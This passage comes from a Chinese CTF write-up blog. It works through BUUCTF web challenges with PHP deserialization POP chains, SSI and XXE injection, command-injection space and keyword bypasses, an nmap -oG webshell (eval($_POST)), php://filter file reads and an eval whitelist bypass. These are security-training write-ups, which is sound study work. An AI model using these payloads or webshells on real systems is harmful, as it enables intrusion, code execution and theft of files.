$allowable_characters[$i]) &#123;            echo &quot;$i $i 0 $length &quot;;            break;        &#125;    &#125;&#125;?&gt;\n\n\n\n利用工具爆破得到种子,根据种子构造解密字符串的Exp:\n\n\n最终得到Flag.\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"MRCTF2020之Ezpop","url":"https://husins.cn/MRCTF2020之Ezpop/","content":"知识点\n魔术方法 __invoke()：当尝试以调用函数的方式调用一个对象时，该方法会被自动调用\n魔术方法__tostring()：将一个对象当做一个字符串来使用时，会自动调用该方法，并且在该方法中，可以返回一定的字符串，以表明该对象转换为字符串之后的结果\n魔术方法__get()：获得一个类的成员变量时调用,通过它可以在对象的外部获取私有成员属性的值,访问不存在的属性或是受限的属性时调用\n序列化Pop链：利用几个类之间相互关联进行构造\n解题\n打开题目，是php的代码,分析代码\nWelcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;\n\n一共存在三个类，先来看第一个类\nclass Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;\n\nappend()函数文件包含,注释中提到flag in flag.php因此,这里就是想办法 $value=flag.php\n接下来利用魔术方法对函数赋值,因此我们需要,以调用函数的方法调用这个对象完成赋值\n第二个类:\nclass Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;\n\n​                                                                                                                                                                    \n__wakeup()反序列化时自动调用,对$this-&gt;source做字符串比较,__toString返回str的source属性\n第三个类:\nclass Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;\n\n__get()把$this-&gt;p当成函数返回\n因此总结pop链的构造:\n\n首先实例化show类,此时反序列化会自动调用__wakeup通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是show类，就调用了__toString()方法\n__toString会访问str的source属性,当str构造为Test类时,Test类不存在source属性,因此会调用__get方法\n__get()方法将p作为函数使用,因此当p实例化为Modifier类时,就可以调用__invoke方法,因此使用伪协议读取flag.php\n\n构造Exp:\n\npayload:?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22ad%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D\n\n最终得到Flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020之EasySearch","url":"https://husins.cn/BJDCTF2020之EasySearch/","content":"知识点\nssi注入:https://blog.csdn.net/qq_40657585/article/details/84260844\n解题\n\n打开题目,又是一个普普通通的登录框,尝试sql注入,没有效果,选择扫目录\n\n扫到一个源码泄露\n\n&lt;?php\tob_start();\tfunction get_hash()&#123;\t\t$chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;;\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\t\t$content = uniqid().$random;\t\treturn sha1($content); \t&#125;    header(&quot;Content-Type: text/html;charset=utf-8&quot;);\t***    if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )    &#123;        $admin = &#x27;6d0bc1&#x27;;        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text = &#x27;            ***            ***            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;            ***\t\t\t***&#x27;;            fwrite($shtml,$text);            fclose($shtml);            ***\t\t\techo &quot;[!] Header  error ...&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;;                &#125;else    &#123;\t***    &#125;\t***?&gt;\n\n用户名密码判断处发现一个MD5截断比较,反手掏出自己珍藏多年的脚本跑一下\n\n跑到一个,尝试一下.\n\n登陆成功,下一步,这里我就卡住了,没有思路,看了别人的wp:\n\n查看数据包,我们发现一个url,直接访问试试\n\n输出了 用户名 时间戳和IP,观察文件后缀名发现,可能存在ssi注入,抓包尝试\n\n\n没有flag文件返回上级目录看看\n\n得到flag文件名,读取flag\n&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;\n\n\n得到flag.\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"NCTF2019之True XML cookbook","url":"https://husins.cn/NCTF2019之True-XML-cookbook/","content":"知识点\n内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trieXXE能够攻击内网\n\n解题\n\n打开题目 是一个 登录框 ,首先想到的是sql注入(万能密码)和扫目录,先尝试扫目录\n\n没啥有用信息,尝试sql注入\n\n\n测试了很多数据,都不能成功\n查看源码\n\n有惊喜,他竟然把登录判读写到了源码里面,结合题目所给的信息,应该是XXE-实体注入\n抓取数据包\n\n修改为XXE的实体\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;\n\n读取一下当前页面源码\n\n&lt;?php/*** autor: c0ny1* date: 2018-2-7*/$USERNAME = &#x27;admin&#x27;; //账号$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);try&#123;\t$dom = new DOMDocument();\t$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\t$creds = simplexml_import_dom($dom);\t$username = $creds-&gt;username;\t$password = $creds-&gt;password;\tif($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;\t\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);\t&#125;else&#123;\t\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);\t&#125;\t&#125;catch(Exception $e)&#123;\t$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);echo $result;?&gt;\n\n\n用正确账号密码登陆 一下 发现 毫无 意义,思路还是要回到xxe上,这里 开始 我就 不会了,通过看别人的博客,发现XXE竟然可以打内网,\n\n我这里 没有扫到 和别人博客一样的存活主机,\n\n查看路由发现了一个主机\n\n爆破ip得到flag\n[NPUCTF2020]ReadlezPHP知识点\nassert和eval区别:https://blog.csdn.net/ojingzhiyuan12/article/details/88556074\n查看源码是 要注意 隐藏的连接 \n解题\n\n\n这里要细心,看了好几遍 没看到.还去扫了目录.\n\n发现是反序列化,不同的是这里 echo$b($a),因此如果b是一个函数,a是变量,就能产生很多 意想不到的效果.\n因此 构造 paylaod\n\n\n发现啥也没有,看看phpinfo()\n\n\n找到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"WUSTCTF2020之朴实无华","url":"https://husins.cn/WUSTCTF2020之朴实无华/","content":"解题:\n\n打开题目,提示正在被攻击,存在一个警告,不能修改头部信息,已发送头部信息,这些信息没有什么思路\n扫描一下目录,\n\n看一下,robots.txt文件\n\n访问一下这个目录\n\n我中计了,接着看fl4g.php\n\n分析一下给出的源代码\n&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123;    $get_flag = $_GET[&#x27;get_flag&#x27;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;\n\n接下来思路就很清晰,绕过三个if得到flag.\n一起来看level 1:intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021\n这里intval()第二个参数没有加,默认解析十进制,所以输入其他进制就会返回0,当后面进行 +1操作的时候,会 转化为十进制在加一\n因此,绕过level 1,只需要找一个十进制比2021 大的非十进制数即可\n构造payload\n?num=0x7e6\n一起再看level 2: $md5==md5($md5)\nmad5的弱类型比较,这里是让一个值本身等于他的MD5加密的值,弱类型比较了就想到科学计数法,这里找一个本身就是0e开头的就好了\n构造\n?num=0x7e6&amp;md5=0e215962017\n一起还看level 3:\n\n不能存在空格\n\ncat 会被替换成wctf2020\n\n命令执行得到flag\n\n\n综上所述,我们需要绕过空格绕过cat读取flag\n\n首先是绕过空格\n\n![image-20201230195901478](https://husins.oss-cn-beijing.aliyuncs.com/20210127114455.png)\n\n使用%09或者$IFS$9代替空格\n\n其次是代替cat\n\n这里选用bat\n构造payload\n?num=0x7e6&amp;md5=0e215962017&amp;get_flag=ls读取当前目录文件\n\n?num=0x7e6&amp;md5=0e215962017&amp;get_flag=bat%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n估计是bat命令没有安装,换个命令\n选择more\n\n得到flag,真的是朴实无华呀!\nca*\n[网鼎杯 2020 朱雀组]Nmap知识点\n解题\n\n\n打开题目,简单尝试让我想到了,之前做过的一道题目\n\n利用nmap -oG写入webshell得到flag\npayload&lt;?php @eval($_POST[&quot;a&quot;]);?&gt; -oG hack.php\n\n提示hacke,怀疑过滤了关键词php\npayload:127.0.0.1&#39; &lt;?= @eval($_POST[&quot;cdm&quot;]);?&gt; -oG cmd.phtml &#39;\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BSidesCF 2020之Had a bad day","url":"https://husins.cn/BSidesCF-2020之Had-a-bad-day/","content":"知识点：\nphp伪协议的参数可以添加无用的，但是整个协议还可以正常使用。\n要注意GET传参和寻常时候不一样的敏感点。\n解题：\n检查题目，没有发现什么功能点，扫一下目录\n\n发现一个flag.php,打开一看，\n\n发现有一句提示，整理一下思路\nindex.php页面没有发现什么有用的功能点,flag.php提示读取这个文件,因此推测,应该是在index.php中通过某种方法,读取flag.php文件\n \n回顾index.php页面,我们发现URL栏中GET传参和平常遇到的不太一样.\n这里就没有什么思路了 ,查看wp发现这里,存在两个可能的点\n\n文件包含或者SQL注入\n\n加上我扫出了flag.php文件,所以推测为是文件包含\n那么就利用php伪协议读取一下flag.php的内容.\n构造payload:\nindex.php?category=php://filter/read=convert.base64-encode/resource=flag.php\n\n发现读取不到,尝试读取index.php文件\n\n这里产生了报错,查看报错信息,我们发现是多出一个.php,应该是读取文件是自动添加.php的后缀\n重新构造payload\nindex.php?category=php://filter/read=convert.base64-encode/resource=index\n\n &lt;?php\t$file = $_GET[&#x27;category&#x27;];\tif(isset($file))&#123;\t\tif( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;\t\t\t\t\t\tinclude ($file . &#x27;.php&#x27;);\t&#125;else&#123;\t\techo &quot;Sorry, we currently only support woofers and meowers.&quot;;\t&#125;&#125;?&gt;\n\n这里 我们发现 文件命里面必须包含woofers或者meowers或者index,所有刚才没有办法直接读取flag.php\n现在的问题是如何在包含这三个字符的条件下读取flag.php\n查看wp发现，其实很简单把这三个字符中的一个当成协议里面的一个参数就好了。\n因此构造payload\nindex.php?category=php://filter/read=convert.base64-encode/index/resource=flag\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"安洵杯 2019之easy_serialize_php","url":"https://husins.cn/安洵杯-2019之easy-serialize-php/","content":"知识点\n**extract()**：将变量从数组中导入当前的符号表，这里就是把post数组里的取出来变成php变量，就比如我们post传a=123,那它经过这个函数就变成了$a=123。而且它默认在变量名冲突的时候进行覆盖，这就导致了变量覆盖漏洞。\n反序列化逃逸吞噬字符串解法。\n解题\n&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION); //销毁session&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function; //为session赋值extract($_POST);if(!$function)&#123;    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123;    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123;    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123;    highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123;    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125;\n\n这到反序列化，是对$_SESSION这个数组进行序列化，这个数组中的user和function都是可控的但是img不可控，file_get_contents读取的是img的内容。因此思路是，找到要读取的文件，然后通过反序列化漏洞操控img的值，读取flag。\n也就是说base64_decode($userinfo[‘img’])=d0g3_f1ag.php\n\n根据提示查看phpinfo。\n\n仔细浏览，发现一个可以文件，flag应该就在这个文件里面\n下一步就系确定如何控制img的值\n\n这里存在一个filter（）过滤函数，想到反序列逃逸\n这里如果存在fileter_arr的值 就会被替换为空，然后在反序列化的过程中，接着向后读取被替换为空的数量的字符，如果满足，正常反序列化。\n因此构造payload：\n正常的序列化字符串\na:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;i:123;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;\n\n把img换成我们需要的值：\na:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;i:123;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n\n得出这样传参得到的序列化字符串\na:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;i:123;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;\n\n利用user吞掉function的值，简介控制img的可得\n_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n\n补全三个参数，必须要凑够3个参数，因为一开始序列化的时候指定了有3个参数 \n_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:1:&quot;a&quot;;&#125;\n\n因为存在extract函数存在变量覆盖漏洞。\n传参?f=show_image\npost=_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:2:”aa”;s:1:”a”;}\n\n将flag所在文件名base64编码重新传参即可。\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"CISCN2019 初赛-Love Math","url":"https://husins.cn/CISCN2019-初赛-Love-Math/","content":"知识点\n\n动态函数php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = &quot;sayHello&quot;;$function();\nphp中函数名默认为字符串例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择\n\n解题\n&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123;    show_source(__FILE__);&#125;else&#123;    //例子 c=20-1    $content = $_GET[&#x27;c&#x27;];    if (strlen($content) &gt;= 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];    preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    //帮你算出答案    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125;\n\n这道题 采用黑白名单禁用了很多字符，只允许使用白名单中的数学函数，初步思路 是利用白名单的数学函数，制造合适的命令执行。\n预计payload\n?c=system(&quot;cat /flag&quot;)\n\n但是函数只能是白名单里面的，（） ” “   / 都被黑名单禁用。\n“ ”可以去掉，不影响命令执行，利用动态函数的性质可以将payload转化\n?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag\n\n这里只检查c，所以a，b什么样子无所谓接下来只要构造c就可以可以了\n首先a b不能出现，但是可以用白名单里面的函数名称，因为存在长度限制，所以选用尽可能短的\n?c=($_GET[max])($_GET[min])&amp;max=system&amp;min=cat /flag\n\n[]也被和名单禁用 因此我们使用{}\n?c=($_GET&#123;max&#125;)($_GET&#123;min&#125;)&amp;max=system&amp;min=cat /flag\n\n此时我们发现只需要构造_GET就可以了\n通过阅读文档我们发现\n\n\n我们还缺少一个转换为ascii的函数 \n\n\n因此payload可转化为\n?c=($hex2bin(5f474554)&#123;max&#125;)($hex2bin(5f474554)&#123;min&#125;)&amp;max=system&amp;min=cat /flag  \n\n下一步用使用base_convert（）和dechex表示hex2bin和5f474554\n\n\n这里为啥不都使用base_convert这个函数，是因为限制了c的长度压缩长度\n此时payload为：\n?c=($base_convert(37907361743,10,36)(dechex(1598506324))&#123;max&#125;)($base_convert(37907361743,10,36)(dechex(1598506324))&#123;min&#125;)&amp;max=system&amp;min=cat /flag \n\n此时长度过长。选取白名单里面的函数，赋值压缩\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;max&#125;(($$pi)&#123;min&#125;)&amp;max=system&amp;min=cat /flag\n\n这里还是太长了，替换变量进一步压缩\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;min&#125;)&amp;pi=system&amp;min=cat /flag\n\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"0CTF 2016之piapiapia","url":"https://husins.cn/0CTF-2016之piapiapia/","content":"知识点:\nstrlen（）函数 判读数组时可绕过对长度的判断\n在目录扫描是 可以尝试 低线程 延时扫描 扫出 多个 只能挨个尝试。\n反序列化逃逸溢出解法。\n解题:\n\n\n\n通过测试不同的数据 产生两种 不同的回显，猜测 是admin 弱密码爆破\n\n爆破一波，并不能成功的爆破出来，接下来的思路是尝试sql注入。\n\n\n诸如此类 尝试了 很多，一点数据库 报错 都没有，放弃SQL注入。F12和返回包也没有提示\n页面也没有其他功能 只能 扫一扫目录了\n\n扫了一波，基本上 字典里面的 状态码 都是 200  没有 办法 也就 148条 挨个 访问。\n访问之后 发现  /regiter.php 和 www.zip 是正常的。 先下载 备份文件看看。\n\n先看看index.php,原来是限制了长度导致的页面不同回显 误导了我。正常登陆之后 跳转到了 profile.php 并且包含了 class.php。\n先看看 包含的class.php文件是什么功能吧。\n&lt;?phprequire(&#x27;config.php&#x27;);class user extends mysql&#123;\tprivate $table = &#x27;users&#x27;;\tpublic function is_exists($username) &#123;\t\t$username = parent::filter($username);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\treturn parent::select($this-&gt;table, $where);\t&#125;\tpublic function register($username, $password) &#123;\t\t$username = parent::filter($username);\t\t$password = parent::filter($password);\t\t$key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;);\t\t$value_list = Array($username, md5($password));\t\treturn parent::insert($this-&gt;table, $key_list, $value_list);\t&#125;\tpublic function login($username, $password) &#123;\t\t$username = parent::filter($username);\t\t$password = parent::filter($password);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\t$object = parent::select($this-&gt;table, $where);\t\tif ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;\t\t\treturn true;\t\t&#125; else &#123;\t\t\treturn false;\t\t&#125;\t&#125;\tpublic function show_profile($username) &#123;\t\t$username = parent::filter($username);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\t$object = parent::select($this-&gt;table, $where);\t\treturn $object-&gt;profile;\t&#125;\tpublic function update_profile($username, $new_profile) &#123;\t\t$username = parent::filter($username);\t\t$new_profile = parent::filter($new_profile);\t\t$where = &quot;username = &#x27;$username&#x27;&quot;;\t\treturn parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);\t&#125;\tpublic function __tostring() &#123;\t\treturn __class__;\t&#125;&#125;class mysql &#123;\tprivate $link = null;\tpublic function connect($config) &#123;\t\t$this-&gt;link = mysql_connect(\t\t\t$config[&#x27;hostname&#x27;],\t\t\t$config[&#x27;username&#x27;], \t\t\t$config[&#x27;password&#x27;]\t\t);\t\tmysql_select_db($config[&#x27;database&#x27;]);\t\tmysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;);\t\treturn $this-&gt;link;\t&#125;\tpublic function select($table, $where, $ret = &#x27;*&#x27;) &#123;\t\t$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;\t\t$result = mysql_query($sql, $this-&gt;link);\t\treturn mysql_fetch_object($result);\t&#125;\tpublic function insert($table, $key_list, $value_list) &#123;\t\t$key = implode(&#x27;,&#x27;, $key_list);\t\t$value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; \t\t$sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;\t\treturn mysql_query($sql);\t&#125;\tpublic function update($table, $key, $value, $where) &#123;\t\t$sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;;\t\treturn mysql_query($sql);\t&#125;\tpublic function filter($string) &#123;\t\t$escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;);\t\t$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;\t\t$string = preg_replace($escape, &#x27;_&#x27;, $string);\t\t$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);\t\t$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;\t\treturn preg_replace($safe, &#x27;hacker&#x27;, $string);\t&#125;\tpublic function __tostring() &#123;\t\treturn __class__;\t&#125;&#125;session_start();$user = new user();$user-&gt;connect($config);\n\n通过 类 完成了 用户的增删改查 并且连接了数据库，写的很死，sql注入没啥机会（也可能是我菜）\n里面还包含了个config.php看看他的功能：\n&lt;?php\t$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;\t$config[&#x27;username&#x27;] = &#x27;root&#x27;;\t$config[&#x27;password&#x27;] = &#x27;&#x27;;\t$config[&#x27;database&#x27;] = &#x27;&#x27;;\t$flag = &#x27;&#x27;;?&gt;\n\n这里 我们能够看到flag，所以这个题 思路就很明确了，通过XX方法来读取config.php的值，然后得到里面的flag。\n接下来看看 profile.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_SESSION[&#x27;username&#x27;] == null) &#123;\t\tdie(&#x27;Login First&#x27;);\t\t&#125;\t$username = $_SESSION[&#x27;username&#x27;];\t$profile=$user-&gt;show_profile($username);\tif($profile  == null) &#123;\t\theader(&#x27;Location: update.php&#x27;);\t&#125;\telse &#123;\t\t$profile = unserialize($profile);\t\t$phone = 